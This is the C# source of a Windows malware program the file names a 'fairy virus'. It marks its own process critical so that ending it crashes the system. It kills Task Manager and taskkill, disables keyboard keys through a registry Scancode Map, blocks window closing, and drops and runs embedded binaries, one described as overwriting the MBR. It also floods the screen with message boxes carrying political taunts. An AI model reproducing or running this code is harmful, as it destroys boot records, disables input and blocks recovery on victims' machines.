using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Text;
//using System.Threading.Tasks;
using System.Windows.Forms;
using System.Threading;
using Microsoft.Win32;
using System.Runtime.InteropServices;
using System.Resources;
using System.Reflection;
using System.IO;
using WMPLib;
using AxWMPLib;


namespace 仙女病毒
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }


        public static Random random = new Random();


        [DllImport("user32.dll")]
        public static extern void MoveWindow(IntPtr hWnd, int X, int Y, int nWidth, int nHeight, bool bRepaint); //修改窗口大小以及位置
        [DllImport("user32.dll")]
        public static extern IntPtr GetForegroundWindow(); //返回顶部窗口句柄
        [DllImport("user32.dll")]
        private static extern int GetWindowRect(IntPtr hwnd, out Rect lpRect); //获取窗口大小
        [DllImport("user32.dll")]
        public static extern IntPtr GetDesktopWindow();
        [DllImport("user32.dll")]
        public static extern IntPtr GetNextWindow(IntPtr hWnd, int wCmd = 1);
        [DllImport("user32.dll")]
        public static extern IntPtr GetWindow(IntPtr hWnd, int wCmd = 5);
        [DllImport("user32.dll")]
        public static extern IntPtr GetDC(IntPtr intPtr);
        [DllImport("user32.dll", EntryPoint = "FindWindow")]
        public static extern void FindWindowEx(IntPtr hwndParent, IntPtr hwndChildAfter, string lpszClass, string lpszWindow);
        [DllImport("user32.dll")]
        public static extern void SetWindowText(IntPtr hWnd, string lpString);
        [DllImport("user32.dll")]
        public static extern void DrawIcon(IntPtr hDC, int X, int Y, int hIcon);
        [DllImport("user32.dll")]
        public static extern int LoadIcon(int hInstance, int lpIconName);
        [DllImport("ntdll.dll")]
        public static extern bool RtlSetProcessIsCritical(bool NewValue, bool OldValue, bool IsWinLogon);
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool CloseHandle(IntPtr hObject);
        [DllImport("user32.dll")]
        public static extern int ShowWindow(IntPtr hwnd, int nCmdShow);

        public struct Rect
        {
            public int Left; //左边
            public int Top; //顶部
            public int Right; //右边
            public int Bottom; //底部
        }
        private void Form1_Load(object sender, EventArgs e)
        {
            Process.EnterDebugMode();
            RtlSetProcessIsCritical(true, false, false);
            OVO form2 = new OVO();
            Hide();
            //new Thread(new ThreadStart(IntPtrMove)).Start();
            void IntPtrMove()
            {
                while (true)
                {
                    for (int i = 0; i < 1000000; i++)
                    {

                        MoveWindow((IntPtr)i, random.Next(0, X / 2), random.Next(0, Y / 2), random.Next(0, X / 2), random.Next(0, Y / 2), false);
                        ShowWindow((IntPtr)i, random.Next(0, 4));

                    }
                    Environment.Exit(0);
                    Thread.Sleep(3000000);
                }
            }




            //Environment.Exit(0);
            new Thread(new ThreadStart(programkill)).Start(); //kill任务管理器
            new Thread(new ThreadStart(funmsgbox)).Start(); //msgbox 每隔一秒弹出信息窗口
            new Thread(new ThreadStart(funreg)).Start(); //注册表(禁用键盘)
            new Thread(new ThreadStart(MBR)).Start(); //写入MBR
            new Thread(new ThreadStart(xiongCMD)).Start(); //在以小熊维尼为核心的病毒党中央坚强领导下，计算机病毒成功地入侵了你的电脑
            new Thread(new ThreadStart(funcVideo)).Start();
            ////new Thread(funcP3).Start(); //ScreenX


            void funcVideo()
            {
                axWindowsMediaPlayer1.Enabled = false;
                Thread.Sleep(10000);
                axWindowsMediaPlayer1.Visible = true;
                this.Visible = true;
                string filepath = Environment.GetEnvironmentVariable("temp") + "/video.mp4";
                FileStream file = new FileStream(filepath, FileMode.Create);
                file.Write(Properties.Resources.video, 0, Properties.Resources.video.Length);
                file.Close();
                Thread.Sleep(1000);
                this.FormBorderStyle = FormBorderStyle.None;
                axWindowsMediaPlayer1.uiMode = "none";
                axWindowsMediaPlayer1.URL = filepath;
                Thread.Sleep(20000);
                new Thread(new ThreadStart(() => form2.ShowDialog())).Start();
                string filepath2 = Environment.GetEnvironmentVariable("temp") + "/cur.exe";
                FileStream file2 = new FileStream(filepath2, FileMode.Create);
                file2.Write(Properties.Resources.curBIN, 0, Properties.Resources.curBIN.Length);
                file2.Close();
                Process.Start(filepath2);
            }
        }

        public static int X = Screen.PrimaryScreen.Bounds.Width;
        public static int Y = Screen.PrimaryScreen.Bounds.Height;
        const int IDI_ERROR = 32513;
        const int IDI_EXCLAMATION = 32515;

        public static void funcP3()
        {
            IntPtr DesktopDC = GetDC(GetDesktopWindow());
            new Thread(P1).Start();
            new Thread(P2).Start();
            new Thread(P3).Start();
            while (true)
            {
                Thread.Sleep(1000);
                DesktopDC = GetDC(GetDesktopWindow());
            }
            void P1()
            {
                while (true)
                {
                    DrawIcon(DesktopDC, random.Next(0, X), random.Next(0, Y / 3), LoadIcon(0, IDI_EXCLAMATION));
                    Thread.Sleep(1);
                }
            }
            void P2()
            {
                while (true)
                {
                    DrawIcon(DesktopDC, random.Next(0, X), random.Next(Y / 3, Y / 3 * 2), LoadIcon(0, IDI_ERROR));
                    Thread.Sleep(1);
                }
            }
            void P3()
            {
                while (true)
                {
                    DrawIcon(DesktopDC, random.Next(0, X), random.Next(Y / 3 * 2, Y), LoadIcon(0, IDI_EXCLAMATION));
                    Thread.Sleep(1);
                }
            }


        }

        public static void xiongCMD()
        {
            string filepath = Environment.GetEnvironmentVariable("temp") + "/xiong.bat";
            string cmd = @"@echo off
color E4
echo 在以小熊维尼为核心的病毒党中央坚强领导下，计算机病毒成功地入侵了你的电脑
pause >nul";
            StreamWriter file = new StreamWriter(new FileStream(filepath, FileMode.Create),Encoding.Default);
            file.Write(cmd);
            file.Close();
            Process.Start(filepath);
            Thread.Sleep(1000);
            File.Delete(filepath);
        }

        public static void MBR()
        {
            string filepath = Environment.GetEnvironmentVariable("temp") + "\\mbr.exe";
            BinaryWriter binaryWriter = new BinaryWriter(new FileStream(Environment.GetEnvironmentVariable("temp") + "\\mbr.exe", FileMode.Create), Encoding.Default);
            binaryWriter.Write(Properties.Resources.MBR, 0, Properties.Resources.MBR.Length);
            binaryWriter.Close();
            Thread.Sleep(1000);
            Process.Start(filepath);
        }

        public static void funmsgbox()
        {
            string[] str = @"轻关易道
通商宽衣
维尼修宪
金科玉律
无限连任
登基称帝
证明民主，小学文化当主席
同意的请举手，谁敢不举手
顺之者昌，逆之者亡
两百斤麦子挑肩上
十里山路不换肩
送到庆丰包子铺
包子铺里有个啥？
有个老板名叫习包子
萨格尔王
格萨尔王
大海掀翻小池塘
吃饱了，没事干
维尼遨游星澣
维尼亲自指挥亲自部署破坏Windows
在你电脑里称帝
一熊当关，万红莫开
GFW带来愉快上网的体验
墙网站，ban IP，污染域名加限速
连DNS都给你改成127.0.0.1
举头三尺有神明
那就是我习维尼
别看你网上闹得欢，小心病毒拉清单
又开后门又挖矿
让你电脑立刻变成矿机肉鸡
国产杀软拿我没办法
因为我用坦克逼着他们给我白名单
你的电脑综合性能输出总值接近八千万
CPU、GPU通通飙到100%
内存条也吃到满
显卡爆炸威力也不过相当于100颗GTX690战术核显卡导弹".Split('\n');
            int strLength =0;
            while (true)
            {
                strLength++;
                Thread.Sleep(2000);
                Thread thread = new Thread(new ThreadStart(funmsg));
                thread.Start();
                if (strLength >= str.Length - 1)
                {
                    break;
                }
                void funmsg()
                {
                    string title = "";
                    for (int i = 0; i <= random.Next(5, 400); i++)
                    {
                        title += char.ConvertFromUtf32(random.Next(20, 20000));
                    }
                    MessageBox.Show(str[strLength], title);
                }
            }
            Thread.Sleep(5000);
            string cmd = @"@echo off
@for /l %%i in (0,0,1) do color E4&color 4E";
            string filepath = Environment.GetEnvironmentVariable("temp") + "/col.bat";
            StreamWriter file = new StreamWriter(new FileStream(filepath, FileMode.Create), Encoding.Default);
            file.Write(cmd);
            file.Close();
            for (int i = 0; i < 5; i++)
            {
                Process.Start(filepath);
            }
            Thread.Sleep(5000);
            File.Delete(filepath);
            MessageBox.Show(@"警告，你的世界即将变成红黄色。，警告
警告，你的世界即将变成红黄色。，警告
警告，你的世界即将变成红黄色。，警告
警告，你的世界即将变成红黄色。，警告
警告，你的世界即将变成红黄色。，警告", "警告，你的世界即将变成红黄色。，警告");
            Thread.Sleep(3000);
            new Thread(funcP3).Start(); //ScreenX
            Thread.Sleep(5000);
            string filepath2 = Environment.GetEnvironmentVariable("temp") + "/px.exe";
            FileStream file2 = new FileStream(filepath2, FileMode.Create);
            file2.Write(Properties.Resources.Cr, 0, Properties.Resources.Cr.Length);
            file2.Close();
            Process.Start(filepath2);
            Thread.Sleep(5000);
            //蓝屏
            {
                Environment.Exit(0);
            }
        }




        public static void funreg()
        {

            string regstr = "00000000000000001e00000000000E0000000E0000003A00000053E000004FE000001C0000000100000047E0000052E00000380000001D0000002A0000005BE000004500000051E0000049E000005EE0000037E0000038E000001DE00000360000005CE00000460000005FE00000390000000F00000063E0000016E000000000";
            byte[] temp = new byte[regstr.Length / 2];
            try
            {
                for (int i = 0; ; i++)
                {
                    temp[i] = Convert.ToByte(regstr.Substring(i * 2, 2), 16);
                }
            }
            catch
            {

            }
            Registry.LocalMachine.CreateSubKey(@"SYSTEM\CurrentControlSet\Control\Keyboard Layout").SetValue("Scancode Map", temp, RegistryValueKind.Binary);

        }
        public static void programkill()
        {
            while (true)
            {
                try
                {
                    Thread.Sleep(0);
                    foreach (var name in Process.GetProcessesByName("taskmgr"))
                    {
                        name.Kill();
                    }
                    foreach (var name in Process.GetProcessesByName("taskkill"))
                    {
                        name.Kill();
                    }
                }
                catch (Exception)
                {
                }
            }
        }



        public int Closeint = 0;
        private int WM_SYSCOMMAND = 0x112;
        private long SC_CLOSE = 0xF060;
        protected override void WndProc(ref Message m) //阻止窗口关闭
        {
            if (m.Msg == WM_SYSCOMMAND)
            {
                if (m.WParam.ToInt64() == SC_CLOSE)
                {
                    return;
                }
            }
            base.WndProc(ref m);
        }

        private void timer1_Tick(object sender, EventArgs e)
        {


        }

        private void timer2_Tick(object sender, EventArgs e)
        {

        }

    }
}
